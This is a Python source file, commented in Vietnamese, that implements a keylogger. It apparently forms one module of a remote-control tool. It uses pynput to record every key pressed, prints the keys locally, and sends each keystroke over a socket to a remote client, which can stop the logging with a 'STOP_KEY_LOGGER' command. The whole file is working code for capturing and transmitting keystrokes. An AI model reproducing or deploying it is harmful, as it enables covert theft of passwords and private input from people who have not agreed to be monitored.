from pynput import keyboard
import threading

def start_keylogger(client_socket):
    keys_pressed = ""
    MAX_LINE_LENGTH = 50  # Độ dài dòng tối đa trước khi tự động xuống dòng
    stop_keylogger = False  # Biến để kiểm soát việc dừng keylogger
    listener = None

    def on_press(key):
        nonlocal keys_pressed, stop_keylogger  # Sử dụng biến keys_pressed và stop_keylogger trong phạm vi hàm

        if stop_keylogger:
            return False  # Dừng listener

        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char  # Lấy ký tự từ phím nhấn
        else:
            key_str = f' {str(key)} '  # Xử lý các phím đặc biệt

        # Nếu phím nhấn là Enter
        if key == keyboard.Key.enter:
            print(f'\rKeys pressed: {keys_pressed}')  # In ra trên cùng một dòng
            keys_pressed = ""  # Reset sau khi nhấn Enter
            print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
        else:
            keys_pressed += key_str  # Cập nhật chuỗi ký tự đã nhấn
            
            # Nếu chuỗi ký tự quá dài, xuống dòng mới mà không lặp lại ký tự
            if len(keys_pressed) > MAX_LINE_LENGTH:
                print(f'\rKeys pressed: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
                keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
            print(f'\rKeys pressed: {keys_pressed}', end='')  # In ra trên cùng một dòng

        # Gửi dữ liệu phím nhấn qua client_socket
        try:
            client_socket.sendall(key_str.encode("utf-8"))
        except Exception as e:
            print(f'Error when sending data to client: {e}')
            return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu

    # Lắng nghe phím nhấn từ client
    def listen_for_commands():
        nonlocal stop_keylogger
        try:
            data = client_socket.recv(1024)
            command = data.decode("utf-8")            
            
            if command == "STOP_KEY_LOGGER":                    
                print("\nReceived stop keylogger command from client")
                stop_keylogger = True  # Đánh dấu dừng keylogger
                
                # Ngay lập tức dừng listener
                if listener is not None:
                    listener.stop()
                    
        except Exception as e:
            print(f"Error receiving command from client: {e}")

     # Bắt đầu lắng nghe sự kiện phím nhấn
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # Bắt đầu lắng nghe phím nhấn

    # Bắt đầu lắng nghe lệnh từ client trong một thread riêng
    listener_thread = threading.Thread(target=listen_for_commands)
    listener_thread.start()

    # Chờ thread lắng nghe lệnh kết thúc (nếu cần thiết)
    listener_thread.join()  # Chờ thread lắng nghe lệnh kết thúc

    listener.stop()  # Dừng listener
    client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))  # Gửi thông báo đến client khi keylogger dừng